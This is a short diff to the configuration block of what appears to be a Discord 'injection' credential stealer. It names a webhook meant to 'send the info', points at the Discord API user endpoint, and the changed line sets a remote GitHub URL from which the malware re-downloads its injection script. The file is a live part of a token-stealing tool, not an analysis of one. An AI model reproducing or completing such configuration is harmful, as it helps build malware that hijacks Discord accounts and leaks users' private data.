@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Discord Injection :3', //name of the webhook thats gonna send the info
   embed_icon: 'https://upload.wikimedia.org/wikipedia/commons/7/71/Black.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 00000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: '', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/kqcl/discord-injection/dev-2/injection.js', //injection url for when it reinjects
 
   
   api: 'https://discord.com/api/v9/users/@me',
